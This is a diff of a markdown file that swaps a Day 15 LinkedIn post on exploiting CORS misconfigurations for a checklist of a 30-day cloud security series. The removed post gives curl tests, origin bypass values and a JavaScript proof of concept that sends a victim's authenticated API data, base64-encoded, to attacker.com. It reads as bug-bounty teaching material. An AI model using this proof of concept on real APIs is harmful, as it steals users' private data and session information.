@@ -1,191 +1,62 @@
-# LinkedIn Post — Day 15/30: CORS Misconfiguration Exploitation
+# ☁️ 30 Days of Cloud Security
 
----
+A 30-day LinkedIn series covering real-world AWS, Azure, and GCP misconfigurations — one attack technique a day, across storage, IAM, secrets, and container security.
 
-Create a LinkedIn post image (1200x628px) and LinkedIn post content for Day 15 of a 30-day API Security Testing series.
+## 📋 Overview
 
-TOPIC: CORS Misconfiguration Exploitation
-CATEGORY: Configuration Flaw
-CVSS: 8.3
-SERIES: 30 Days of API Security Testing (pure technical, one technique per day, no stories or polls)
+| | |
+|---|---|
+| **Duration** | 30 days |
+| **Categories** | 4 |
+| **Cloud Providers** | AWS, Azure, GCP |
+| **Format** | Technique + exploitation context + fix, one per day |
 
----
+## 🗓️ Full Checklist
 
-TASK 1 — LinkedIn Card Image (1200x628px, light/white background):
-- Light theme — white/light blue background with subtle dot grid pattern
-- Left side:
-  - "DAY 15 / 30" badge (blue)
-  - "⚙️ CONFIG" type chip (green)
-  - Eyebrow text: "CORS Misconfiguration"
-  - Large headline (Bebas Neue font): "CORS Miscon fig Ex ploit"
-  - Subline: "If Access-Control-Allow-Origin reflects attacker.com and Allow-Credentials is true — any website can steal authenticated API responses from victims."
-  - 3 stat pills: CVSS: 8.3 | Impact: ATO | Severity: HIGH
-- Right side:
-  - Dark terminal block (#1e1b4b) with syntax-highlighted CORS test commands:
-    - curl with Origin: https://attacker.com header
-    - Response showing ACAO and ACAC headers (vulnerable)
-    - JavaScript PoC fetch exploit code
-  - 3 step cards showing how to find and exploit it
-- Color theme: blue/teal/green accents (#3b82f6, #0ea5e9, #10b981)
-- Fonts: Bebas Neue headlines, JetBrains Mono code, Space Grotesk body
+### Week 1 — Storage Misconfigurations (Day 1–8)
+- [ ] Day 01 — Public S3 bucket enumeration & data exposure
+- [ ] Day 02 — S3 bucket policy misconfig (public write access)
+- [ ] Day 03 — S3 presigned URL abuse
+- [ ] Day 04 — Azure Blob Storage public container leaks
+- [ ] Day 05 — GCP Cloud Storage bucket misconfig
+- [ ] Day 06 — Exposed `.git` / `.env` files via cloud storage
+- [ ] Day 07 — CDN / CloudFront origin exposure
+- [ ] Day 08 — Terraform state file leaks (S3 backend)
 
----
+### Week 2 — IAM & Privilege Escalation (Day 9–16)
+- [ ] Day 09 — AWS IAM wildcard permission abuse
+- [ ] Day 10 — IAM role assumption abuse (`sts:AssumeRole`)
+- [ ] Day 11 — EC2 instance metadata service (IMDSv1) SSRF → credential theft
+- [ ] Day 12 — Lambda over-permissioned execution roles
+- [ ] Day 13 — Cross-account role trust misconfig
+- [ ] Day 14 — Azure AD app registration privilege escalation
+- [ ] Day 15 — GCP service account impersonation
+- [ ] Day 16 — GCP overly permissive IAM bindings (Owner/Editor)
 
-TASK 2 — LinkedIn Post (English, pure technical, no fluff, no emojis except at start):
+### Week 3 — Secrets Exposure (Day 17–22)
+- [ ] Day 17 — AWS Secrets Manager public access misconfig
+- [ ] Day 18 — Hardcoded secrets in Lambda env variables
+- [ ] Day 19 — Exposed API keys in public repos tied to cloud accounts
+- [ ] Day 20 — Kubernetes secrets stored in plaintext
+- [ ] Day 21 — Docker image layer secret leakage
+- [ ] Day 22 — CI/CD pipeline secret exposure (GitHub Actions / Jenkins)
 
-Write a detailed technical LinkedIn post covering:
+### Week 4 — Container & Cluster Escape (Day 23–30)
+- [ ] Day 23 — Container escape via privileged containers
+- [ ] Day 24 — Docker socket exposure (`docker.sock` mount)
+- [ ] Day 25 — Kubernetes RBAC misconfig — cluster-admin abuse
+- [ ] Day 26 — Pod security policy bypass
+- [ ] Day 27 — Node compromise via kubelet API (EKS/AKS/GKE)
+- [ ] Day 28 — Serverless function injection (Lambda/Azure Functions)
+- [ ] Day 29 — Cloud misconfig scanning tools (ScoutSuite, Prowler, CloudSploit)
+- [ ] Day 30 — Recap + build-your-own cloud security checklist
 
-Opening hook (1-2 lines max):
-"The API allows any website to read your authenticated responses. Here's exactly how to find and exploit CORS misconfigurations."
+## 📦 Deliverables per Day
+- 1 LinkedIn post (technical, short, ends with a question + hashtags)
+- 1 card image (1200×628 PNG, design system: dot grid, dark terminal block, two-column layout)
 
-Content to cover:
-1. What CORS is and why it exists (Same-Origin Policy, preflight requests)
-2. What makes it vulnerable — two conditions BOTH required:
-   - Access-Control-Allow-Origin reflects arbitrary origin (not just wildcard *)
-   - Access-Control-Allow-Credentials: true
-3. How to test — exact curl command:
-   curl -H "Origin: https://attacker.com" -I https://api.target.com/user/profile
-   Check for ACAO header reflecting your origin
-4. All origin bypass variations to test:
-   - https://attacker.com (arbitrary reflection)
-   - null origin
-   - https://target.com.attacker.com (suffix bypass)
-   - https://attackertarget.com (prefix bypass)
-   - https://target.com (subdomain with XSS chain)
-5. Full JavaScript PoC exploit code:
-   fetch('https://api.target.com/user/profile', {credentials: 'include'})
-     .then(r => r.text())
-     .then(data => fetch('https://attacker.com/steal?d=' + btoa(data)))
-6. Where to host the PoC and how to demonstrate impact for the report
-7. Tools: Corsy (github.com/s0md3v/Corsy), Burp Suite, CORStest
-8. CVSS: 8.3 — High
-9. End with a technical question for comments
-
-Hashtags: #CORS #APISecurity #BugBounty #WebSecurity #EthicalHacking #Cybersecurity #APITesting #LearningInPublic
-
----
-
-FORMAT RULES:
-- No polls, no stories, no "Day X of my journey" narrative
-- Pure technical content only
-- Use code blocks with backticks for all commands and payloads
-- Keep it factual and actionable
-- Best posting time note at end: Tue-Thu, 8-10 AM ISTfind and exploit CORS misconfigurations.
-
----
-
-**Day 15/30 — 30 Days of API Security Testing**
-**Category:** Configuration Flaw | **CVSS: 8.3 — High**
-
----
-
-**What CORS is and why it exists**
-
-The Same-Origin Policy (SOP) is the browser's default protection — it blocks JavaScript on `https://evil.com` from reading responses from `https://api.bank.com`. CORS is the mechanism that lets servers *relax* this policy by sending specific headers that tell the browser which external origins are permitted to read responses.
-
-Without CORS headers, cross-origin requests are blocked at the browser level. With misconfigured CORS headers, that protection evaporates — and any website can silently read your users' authenticated API data.
-
----
-
-**Two conditions — BOTH required for exploitability**
-
-A CORS vulnerability is only exploitable when two headers appear together in the response:
-
-1. `Access-Control-Allow-Origin` reflects the attacker's origin (not just `*`)
-2. `Access-Control-Allow-Credentials: true`
-
-Wildcard (`*`) with credentials is blocked by browsers. The dangerous pattern is when the server *dynamically reflects* whatever origin the client sends, combined with credential forwarding.
-
----
-
-**How to test — exact curl command**
-
-```bash
-curl -H "Origin: https://attacker.com" -I https://api.target.com/user/profile
-```
-
-A vulnerable response looks like this:
-
-```
-Access-Control-Allow-Origin: https://attacker.com
-Access-Control-Allow-Credentials: true
-```
-
-If the server echoes back your injected origin and allows credentials, you have a confirmed CORS misconfiguration.
-
----
-
-**All origin bypass variations to test**
-
-Don't stop at a single payload. Test all of these:
-
-```bash
-# 1. Arbitrary origin reflection
-Origin: https://attacker.com
-
-# 2. Null origin bypass (sandboxed iframes allow this)
-Origin: null
-
-# 3. Suffix bypass — domain ends with target domain
-Origin: https://target.com.attacker.com
-
-# 4. Prefix bypass — domain starts with target name
-Origin: https://attackertarget.com
-
-# 5. Subdomain chain — requires XSS on any subdomain
-Origin: https://sub.target.com
-```
-
-Many implementations use a naive `includes()` or `endsWith()` check instead of exact-match validation. Suffix and prefix bypasses exploit exactly that.
-
----
-
-**Full JavaScript PoC exploit**
-
-Host this on your attacker-controlled domain and send the link to the victim (or use Burp Collaborator for blind exfil):
-
-```javascript
-fetch('https://api.target.com/user/profile', {
-  credentials: 'include'
-})
-  .then(r => r.text())
-  .then(data => fetch('https://attacker.com/steal?d=' + btoa(data)));
-```
-
-When the victim's browser loads this page, it sends the request with their session cookies, the server responds with their authenticated data, and the PoC exfiltrates the base64-encoded response to your listener.
-
----
-
-**Demonstrating impact for the report**
-
-1. Host the PoC on any public server (Netlify, GitHub Pages, or a simple Python HTTP server via ngrok)
-2. Open the PoC URL in a browser where you're logged into the target API
-3. Check your attacker server logs — you'll receive the victim's session data
-4. Screenshot the stolen response and the request/response pair from Burp
-5. For maximum clarity in the report: show the reflected ACAO header, the PoC page source, and the exfiltrated response body side by side
-
----
-
-**Tools**
-
-- **Corsy** — automated CORS misconfiguration scanner: `github.com/s0md3v/Corsy`
-- **Burp Suite** — inspect preflight and actual request/response headers, use Repeater to test all bypass variants
-- **CORStest** — `github.com/RUB-NDS/CORStest` — batch-tests origin reflection patterns
-
----
-
-**CVSS: 8.3 — High**
-Confidentiality: High | Integrity: Low | Availability: None
-Attack Vector: Network | Authentication: None required from attacker
-
----
-
-**What bypass variant do you test first — null origin or suffix bypass? And have you seen CORS misconfigurations chained with XSS for a full ATO?**
-
----
-
-#CORS #APISecurity #BugBounty #WebSecurity #EthicalHacking #Cybersecurity #APITesting #LearningInPublic
-
+## 🏷️ Suggested Hashtags
+`#CloudSecurity` `#AWS` `#Azure` `#GCP` `#CyberSecurity` `#DevSecOps` `#InfoSec`
 ---
 
 > **Best posting time:** Tuesday–Thursday, 8–10 AM IST
